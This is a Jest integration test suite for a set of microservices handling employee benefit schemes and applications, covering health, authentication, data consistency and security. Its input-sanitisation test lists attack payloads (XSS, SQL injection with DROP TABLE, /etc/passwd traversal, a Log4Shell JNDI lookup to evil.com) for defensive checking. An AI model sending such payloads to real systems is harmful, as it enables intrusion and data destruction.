import axios from 'axios';
import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';

// Service endpoints
const SERVICES = {
  USER_SERVICE: process.env.USER_SERVICE_URL || 'http://localhost:3001',
  SCHEME_SERVICE: process.env.SCHEME_SERVICE_URL || 'http://localhost:3002',
  APPLICATION_SERVICE: process.env.APPLICATION_SERVICE_URL || 'http://localhost:3003',
  DOCUMENT_SERVICE: process.env.DOCUMENT_SERVICE_URL || 'http://localhost:3004',
  NOTIFICATION_SERVICE: process.env.NOTIFICATION_SERVICE_URL || 'http://localhost:3005'
};

interface ServiceHealthStatus {
  service: string;
  healthy: boolean;
  responseTime: number;
  version?: string;
  dependencies?: { [key: string]: boolean };
}

interface IntegrationTestResult {
  testName: string;
  success: boolean;
  responseTime: number;
  error?: string;
  data?: any;
}

let adminToken: string;
let testUserId: string;

describe('Service Integration and Data Flow Validation', () => {
  beforeAll(async () => {
    console.log('🔍 Starting Service Integration Validation');
    await waitForAllServices();
    await setupAdminUser();
  }, 60000);

  describe('1. Service Health and Dependency Validation', () => {
    test('Should validate all services are healthy with proper dependencies', async () => {
      const healthStatuses: ServiceHealthStatus[] = [];
      
      for (const [serviceName, serviceUrl] of Object.entries(SERVICES)) {
        const startTime = Date.now();
        try {
          const response = await axios.get(`${serviceUrl}/health`, { timeout: 10000 });
          const responseTime = Date.now() - startTime;
          
          healthStatuses.push({
            service: serviceName,
            healthy: true,
            responseTime,
            version: response.data.version,
            dependencies: response.data.dependencies
          });
          
          expect(response.status).toBe(200);
          expect(response.data).toHaveProperty('service');
          expect(responseTime).toBeLessThan(5000); // Health checks should be fast
          
        } catch (error: any) {
          const responseTime = Date.now() - startTime;
          healthStatuses.push({
            service: serviceName,
            healthy: false,
            responseTime,
            error: error.message
          });
          
          throw new Error(`${serviceName} health check failed: ${error.message}`);
        }
      }
      
      console.log('Service Health Summary:');
      healthStatuses.forEach(status => {
        console.log(`  ${status.service}: ${status.healthy ? '✅' : '❌'} (${status.responseTime}ms)`);
      });
    });

    test('Should validate service version compatibility', async () => {
      const versions: { [key: string]: string } = {};
      
      for (const [serviceName, serviceUrl] of Object.entries(SERVICES)) {
        const response = await axios.get(`${serviceUrl}/health`);
        versions[serviceName] = response.data.version || 'unknown';
      }
      
      // All services should have version information
      Object.entries(versions).forEach(([service, version]) => {
        expect(version).not.toBe('unknown');
        expect(version).toMatch(/^\d+\.\d+\.\d+/); // Semantic versioning
      });
      
      console.log('Service Versions:', versions);
    });

    test('Should validate database connectivity across services', async () => {
      const dbHealthChecks = [
        { service: 'USER_SERVICE', endpoint: `${SERVICES.USER_SERVICE}/health/database` },
        { service: 'SCHEME_SERVICE', endpoint: `${SERVICES.SCHEME_SERVICE}/health/database` },
        { service: 'APPLICATION_SERVICE', endpoint: `${SERVICES.APPLICATION_SERVICE}/health/database` },
        { service: 'DOCUMENT_SERVICE', endpoint: `${SERVICES.DOCUMENT_SERVICE}/health/database` }
      ];
      
      for (const check of dbHealthChecks) {
        try {
          const response = await axios.get(check.endpoint, { timeout: 10000 });
          expect(response.status).toBe(200);
          expect(response.data.database).toBe('connected');
        } catch (error: any) {
          if (error.response?.status === 404) {
            // Endpoint might not exist, check general health
            const healthResponse = await axios.get(`${check.endpoint.split('/health')[0]}/health`);
            expect(healthResponse.status).toBe(200);
          } else {
            throw error;
          }
        }
      }
    });
  });

  describe('2. Cross-Service Authentication and Authorization', () => {
    test('Should validate token propagation across all services', async () => {
      const testResults: IntegrationTestResult[] = [];
      
      // Test authenticated endpoints across all services
      const authenticatedEndpoints = [
        { service: 'USER_SERVICE', endpoint: `${SERVICES.USER_SERVICE}/api/auth/verify-token`, method: 'GET' },
        { service: 'SCHEME_SERVICE', endpoint: `${SERVICES.SCHEME_SERVICE}/api/schemes`, method: 'GET' },
        { service: 'APPLICATION_SERVICE', endpoint: `${SERVICES.APPLICATION_SERVICE}/api/applications`, method: 'GET' },
        { service: 'DOCUMENT_SERVICE', endpoint: `${SERVICES.DOCUMENT_SERVICE}/api/documents`, method: 'GET' },
        { service: 'NOTIFICATION_SERVICE', endpoint: `${SERVICES.NOTIFICATION_SERVICE}/api/notifications`, method: 'GET' }
      ];
      
      for (const endpoint of authenticatedEndpoints) {
        const startTime = Date.now();
        try {
          const response = await axios.get(endpoint.endpoint, {
            headers: { Authorization: `Bearer ${adminToken}` },
            timeout: 10000
          });
          
          const responseTime = Date.now() - startTime;
          testResults.push({
            testName: `${endpoint.service} authentication`,
            success: true,
            responseTime,
            data: { status: response.status }
          });
          
          expect(response.status).toBe(200);
          
        } catch (error: any) {
          const responseTime = Date.now() - startTime;
          testResults.push({
            testName: `${endpoint.service} authentication`,
            success: false,
            responseTime,
            error: error.message
          });
          
          throw new Error(`Authentication failed for ${endpoint.service}: ${error.message}`);
        }
      }
      
      console.log('Authentication Test Results:');
      testResults.forEach(result => {
        console.log(`  ${result.testName}: ${result.success ? '✅' : '❌'} (${result.responseTime}ms)`);
      });
    });

    test('Should validate role-based access control across services', async () => {
      // Test different role permissions
      const roleTests = [
        {
          role: 'employee',
          allowedEndpoints: [
            `${SERVICES.SCHEME_SERVICE}/api/schemes/eligible`,
            `${SERVICES.APPLICATION_SERVICE}/api/applications`
          ],
          deniedEndpoints: [
            `${SERVICES.USER_SERVICE}/api/admin/users`,
            `${SERVICES.SCHEME_SERVICE}/api/admin/schemes`
          ]
        }
      ];
      
      for (const roleTest of roleTests) {
        // Test allowed endpoints
        for (const endpoint of roleTest.allowedEndpoints) {
          const response = await axios.get(endpoint, {
            headers: { Authorization: `Bearer ${adminToken}` }
          });
          expect([200, 201, 204].includes(response.status)).toBe(true);
        }
        
        // Test denied endpoints (should return 403 or 401)
        for (const endpoint of roleTest.deniedEndpoints) {
          try {
            await axios.get(endpoint, {
              headers: { Authorization: `Bearer ${adminToken}` }
            });
            // If we get here without error, the endpoint might not exist or have different auth
          } catch (error: any) {
            if (error.response) {
              expect([401, 403, 404].includes(error.response.status)).toBe(true);
            }
          }
        }
      }
    });

    test('Should validate session management and token expiry handling', async () => {
      // Test with invalid token
      try {
        await axios.get(`${SERVICES.USER_SERVICE}/api/auth/verify-token`, {
          headers: { Authorization: 'Bearer invalid-token-12345' }
        });
        throw new Error('Should have failed with invalid token');
      } catch (error: any) {
        expect(error.response.status).toBe(401);
      }
      
      // Test with malformed token
      try {
        await axios.get(`${SERVICES.SCHEME_SERVICE}/api/schemes`, {
          headers: { Authorization: 'Bearer malformed.token.here' }
        });
        throw new Error('Should have failed with malformed token');
      } catch (error: any) {
        expect(error.response.status).toBe(401);
      }
      
      // Test with missing Authorization header
      try {
        await axios.get(`${SERVICES.APPLICATION_SERVICE}/api/applications`);
        throw new Error('Should have failed without authorization header');
      } catch (error: any) {
        expect(error.response.status).toBe(401);
      }
    });
  });

  describe('3. Data Consistency and Synchronization', () => {
    test('Should validate user data consistency across services', async () => {
      // Get user data from user service
      const userResponse = await axios.get(
        `${SERVICES.USER_SERVICE}/api/users/${testUserId}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      const userData = userResponse.data.data;
      expect(userData.userId).toBe(testUserId);
      
      // Verify the same user data is accessible from other services
      const applicationResponse = await axios.get(
        `${SERVICES.APPLICATION_SERVICE}/api/users/${testUserId}/applications`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      expect(applicationResponse.status).toBe(200);
      // The service should recognize the user ID
      expect(Array.isArray(applicationResponse.data.data)).toBe(true);
    });

    test('Should validate scheme data consistency across services', async () => {
      // Create a test scheme
      const schemeData = {
        name: 'Integration Test Scheme',
        category: 'medical',
        description: 'Scheme for integration testing',
        eligibilityRules: {
          serviceYears: 1,
          salaryRange: { min: 0, max: 1000000 }
        },
        status: 'active',
        validFrom: new Date(),
        validTo: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000)
      };
      
      const createResponse = await axios.post(
        `${SERVICES.SCHEME_SERVICE}/api/schemes`,
        schemeData,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      const schemeId = createResponse.data.data.schemeId;
      expect(schemeId).toBeDefined();
      
      // Verify scheme is accessible from application service
      const eligibilityResponse = await axios.get(
        `${SERVICES.SCHEME_SERVICE}/api/schemes/${schemeId}/eligibility`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      expect(eligibilityResponse.status).toBe(200);
      expect(eligibilityResponse.data.data).toHaveProperty('eligible');
      
      // Cleanup
      await axios.delete(
        `${SERVICES.SCHEME_SERVICE}/api/schemes/${schemeId}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
    });

    test('Should validate application workflow data flow', async () => {
      // Create scheme first
      const schemeResponse = await axios.post(
        `${SERVICES.SCHEME_SERVICE}/api/schemes`,
        {
          name: 'Workflow Test Scheme',
          category: 'medical',
          description: 'Scheme for workflow testing',
          eligibilityRules: { serviceYears: 0, salaryRange: { min: 0, max: 1000000 } },
          status: 'active',
          validFrom: new Date(),
          validTo: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000)
        },
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      const schemeId = schemeResponse.data.data.schemeId;
      
      // Create application
      const applicationResponse = await axios.post(
        `${SERVICES.APPLICATION_SERVICE}/api/applications`,
        {
          schemeId,
          applicationData: {
            claimAmount: 5000,
            purpose: 'Integration test application',
            beneficiary: 'Self'
          }
        },
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      const applicationId = applicationResponse.data.data.applicationId;
      expect(applicationId).toBeDefined();
      
      // Verify application references correct scheme
      const getAppResponse = await axios.get(
        `${SERVICES.APPLICATION_SERVICE}/api/applications/${applicationId}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      expect(getAppResponse.data.data.schemeId).toBe(schemeId);
      expect(getAppResponse.data.data.userId).toBe(testUserId);
      
      // Cleanup
      await axios.delete(
        `${SERVICES.APPLICATION_SERVICE}/api/applications/${applicationId}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
      
      await axios.delete(
        `${SERVICES.SCHEME_SERVICE}/api/schemes/${schemeId}`,
        { headers: { Authorization: `Bearer ${adminToken}` } }
      );
    });
  });

  describe('4. API Contract Validation', () => {
    test('Should validate consistent error response formats', async () => {
      const errorTests = [
        { service: 'USER_SERVICE', endpoint: `${SERVICES.USER_SERVICE}/api/nonexistent` },
        { service: 'SCHEME_SERVICE', endpoint: `${SERVICES.SCHEME_SERVICE}/api/nonexistent` },
        { service: 'APPLICATION_SERVICE', endpoint: `${SERVICES.APPLICATION_SERVICE}/api/nonexistent` },
        { service: 'DOCUMENT_SERVICE', endpoint: `${SERVICES.DOCUMENT_SERVICE}/api/nonexistent` }
      ];
      
      for (const errorTest of errorTests) {
        try {
          await axios.get(errorTest.endpoint);
          throw new Error(`Expected 404 error for ${errorTest.service}`);
        } catch (error: any) {
          expect(error.response.status).toBe(404);
          
          // Validate error response structure
          const errorResponse = error.response.data;
          expect(errorResponse).toHaveProperty('success', false);
          expect(errorResponse).toHaveProperty('error');
          expect(typeof errorResponse.error).toBe('string');
        }
      }
    });

    test('Should validate consistent success response formats', async () => {
      const successTests = [
        { service: 'USER_SERVICE', endpoint: `${SERVICES.USER_SERVICE}/health` },
        { service: 'SCHEME_SERVICE', endpoint: `${SERVICES.SCHEME_SERVICE}/health` },
        { service: 'APPLICATION_SERVICE', endpoint: `${SERVICES.APPLICATION_SERVICE}/health` },
        { service: 'DOCUMENT_SERVICE', endpoint: `${SERVICES.DOCUMENT_SERVICE}/health` }
      ];
      
      for (const successTest of successTests) {
        const response = await axios.get(successTest.endpoint);
        expect(response.status).toBe(200);
        
        // Validate response structure
        const responseData = response.data;
        expect(responseData).toHaveProperty('service');
        expect(responseData).toHaveProperty('timestamp');
        expect(typeof responseData.timestamp).toBe('string');
      }
    });

    test('Should validate request/response content types', async () => {
      const response = await axios.get(`${SERVICES.USER_SERVICE}/health`);
      
      expect(response.headers['content-type']).toContain('application/json');
      expect(response.data).toBeInstanceOf(Object);
    });

    test('Should validate CORS headers for cross-origin requests', async () => {
      const response = await axios.get(`${SERVICES.USER_SERVICE}/health`, {
        headers: {
          'Origin': 'http://localhost:3000',
          'Access-Control-Request-Method': 'GET'
        }
      });
      
      expect(response.status).toBe(200);
      // CORS headers should be present (implementation dependent)
    });
  });

  describe('5. Performance and Scalability Integration', () => {
    test('Should validate response time consistency across services', async () => {
      const performanceTests = [
        { service: 'USER_SERVICE', endpoint: `${SERVICES.USER_SERVICE}/health` },
        { service: 'SCHEME_SERVICE', endpoint: `${SERVICES.SCHEME_SERVICE}/health` },
        { service: 'APPLICATION_SERVICE', endpoint: `${SERVICES.APPLICATION_SERVICE}/health` },
        { service: 'DOCUMENT_SERVICE', endpoint: `${SERVICES.DOCUMENT_SERVICE}/health` }
      ];
      
      const results: { service: string; responseTime: number }[] = [];
      
      for (const test of performanceTests) {
        const startTime = Date.now();
        await axios.get(test.endpoint);
        const responseTime = Date.now() - startTime;
        
        results.push({ service: test.service, responseTime });
        expect(responseTime).toBeLessThan(3000); // 3 second threshold
      }
      
      console.log('Service Response Times:');
      results.forEach(result => {
        console.log(`  ${result.service}: ${result.responseTime}ms`);
      });
    });

    test('Should validate concurrent request handling', async () => {
      const concurrentRequests = 10;
      const promises: Promise<any>[] = [];
      
      for (let i = 0; i < concurrentRequests; i++) {
        promises.push(
          axios.get(`${SERVICES.USER_SERVICE}/health`, { timeout: 10000 })
        );
      }
      
      const startTime = Date.now();
      const responses = await Promise.all(promises);
      const totalTime = Date.now() - startTime;
      
      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });
      
      // Should handle concurrent requests efficiently
      expect(totalTime).toBeLessThan(5000); // Should complete within 5 seconds
      
      console.log(`Concurrent requests (${concurrentRequests}): ${totalTime}ms total`);
    });
  });

  describe('6. Error Handling and Resilience', () => {
    test('Should handle service unavailability gracefully', async () => {
      // Test with very short timeout to simulate service unavailability
      try {
        await axios.get(`${SERVICES.USER_SERVICE}/health`, { timeout: 1 });
      } catch (error: any) {
        // Should get a timeout or connection error
        expect(['ECONNABORTED', 'ECONNREFUSED', 'ETIMEDOUT'].some(code => 
          error.code === code || error.message.includes(code)
        )).toBe(true);
      }
    });

    test('Should validate circuit breaker behavior', async () => {
      // This would require implementing circuit breaker patterns
      // For now, test basic error handling
      
      const invalidRequests = 5;
      let errorCount = 0;
      
      for (let i = 0; i < invalidRequests; i++) {
        try {
          await axios.get(`${SERVICES.USER_SERVICE}/api/invalid-endpoint-${i}`);
        } catch (error: any) {
          if (error.response?.status === 404) {
            errorCount++;
          }
        }
      }
      
      expect(errorCount).toBe(invalidRequests);
    });

    test('Should validate retry mechanisms for transient failures', async () => {
      // Test with intermittent network issues
      let successCount = 0;
      const attempts = 3;
      
      for (let i = 0; i < attempts; i++) {
        try {
          const response = await axios.get(`${SERVICES.USER_SERVICE}/health`, {
            timeout: 5000,
            retry: 2
          });
          if (response.status === 200) {
            successCount++;
          }
        } catch (error) {
          // Expected for some attempts
        }
      }
      
      expect(successCount).toBeGreaterThan(0);
    });
  });

  describe('7. Security Integration Validation', () => {
    test('Should validate HTTPS enforcement in production', async () => {
      // This test would be environment-specific
      // For now, validate that services accept HTTPS requests
      
      for (const [serviceName, serviceUrl] of Object.entries(SERVICES)) {
        const response = await axios.get(`${serviceUrl}/health`);
        expect(response.status).toBe(200);
        
        // In production, should redirect HTTP to HTTPS or reject HTTP
        if (process.env.NODE_ENV === 'production') {
          expect(serviceUrl.startsWith('https://')).toBe(true);
        }
      }
    });

    test('Should validate security headers', async () => {
      const response = await axios.get(`${SERVICES.USER_SERVICE}/health`);
      
      // Check for security headers (implementation dependent)
      const headers = response.headers;
      
      // These might not be present in test environment
      if (headers['x-frame-options']) {
        expect(headers['x-frame-options']).toBeDefined();
      }
      
      if (headers['x-content-type-options']) {
        expect(headers['x-content-type-options']).toBe('nosniff');
      }
    });

    test('Should validate input sanitization across services', async () => {
      // Test with potentially malicious input
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'SELECT * FROM users; DROP TABLE users;',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];
      
      for (const input of maliciousInputs) {
        try {
          // Test login endpoint with malicious input
          await axios.post(`${SERVICES.USER_SERVICE}/api/auth/login`, {
            email: input,
            password: input
          });
        } catch (error: any) {
          // Should get validation error, not server error
          expect([400, 401, 422].includes(error.response?.status)).toBe(true);
        }
      }
    });
  });

  afterAll(async () => {
    console.log('🧹 Cleaning up integration test data...');
    // Cleanup handled by individual tests
  }, 30000);
});

// Helper functions
async function waitForAllServices(): Promise<void> {
  console.log('⏳ Waiting for all services to be ready...');
  
  const maxRetries = 30;
  const retryDelay = 2000;

  for (const [serviceName, serviceUrl] of Object.entries(SERVICES)) {
    let retries = 0;
    while (retries < maxRetries) {
      try {
        await axios.get(`${serviceUrl}/health`, { timeout: 5000 });
        console.log(`✅ ${serviceName} is ready`);
        break;
      } catch (error) {
        retries++;
        if (retries === maxRetries) {
          throw new Error(`${serviceName} failed to start after ${maxRetries} retries`);
        }
        await new Promise(resolve => setTimeout(resolve, retryDelay));
      }
    }
  }
}

async function setupAdminUser(): Promise<void> {
  console.log('👤 Setting up admin user for integration tests...');
  
  const adminUserData = {
    employeeId: 'ADMIN_INT_001',
    email: 'integration.admin@lnt.com',
    password: 'AdminPassword123!',
    personalInfo: {
      name: 'Integration Test Admin',
      phone: '9876543210'
    },
    roles: ['employee', 'admin', 'approver', 'finance']
  };
  
  try {
    // Create admin user
    const createResponse = await axios.post(`${SERVICES.USER_SERVICE}/api/users`, adminUserData);
    testUserId = createResponse.data.data.userId;
  } catch (error: any) {
    if (error.response?.status === 409) {
      // User exists, get by login
      console.log('Admin user already exists, logging in...');
    } else {
      throw error;
    }
  }
  
  // Login to get admin token
  const loginResponse = await axios.post(`${SERVICES.USER_SERVICE}/api/auth/login`, {
    email: adminUserData.email,
    password: adminUserData.password
  });
  
  adminToken = loginResponse.data.data.token;
  testUserId = loginResponse.data.data.user.userId;
  
  console.log('✅ Admin user setup complete');
}